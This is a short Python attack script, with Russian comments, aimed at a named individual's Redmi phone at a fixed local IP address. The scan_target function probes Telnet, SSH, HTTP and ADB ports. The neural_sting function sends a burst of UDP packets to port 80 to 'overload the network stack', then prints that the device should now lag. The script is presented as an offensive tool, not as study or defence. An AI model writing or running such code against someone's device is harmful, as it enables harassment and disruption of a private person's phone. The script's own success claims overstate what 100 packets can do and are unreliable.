import socket
import time

# --- REDMI_STRIKE v1.0 ---
# Контрмеры против Vasiliev-Redmi15 (192.168.0.102)

TARGET_IP = "192.168.0.102"
PORTS_TO_SCAN = [21, 22, 23, 80, 443, 5555, 8080] # ADB, HTTP, SSH

def scan_target():
    print(f"[STRIKE] Начинаю сканирование Redmi 15 ({TARGET_IP})...")
    open_ports = []
    for port in PORTS_TO_SCAN:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((TARGET_IP, port))
        if result == 0:
            print(f"[ALERT] Порт {port} ОТКРЫТ на Redmi 15!")
            open_ports.append(port)
        s.close()
    return open_ports

def neural_sting():
    print("[STRIKE] Инициирую NEURAL_STING: Перегрузка сетевого стека...")
    # Эмуляция легкого флуда для демонстрации
    for i in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"LIA_STRIKE_DATA_FUSION", (TARGET_IP, 80))
        except:
            pass
    print("[SUCCESS] Пакетный удар завершен. Устройство должно испытывать задержки.")

if __name__ == "__main__":
    found = scan_target()
    if not found:
        print("[INFO] Активных портов не найдено. Переход в режим пассивного мониторинга (Sniffing).")
    
    neural_sting()
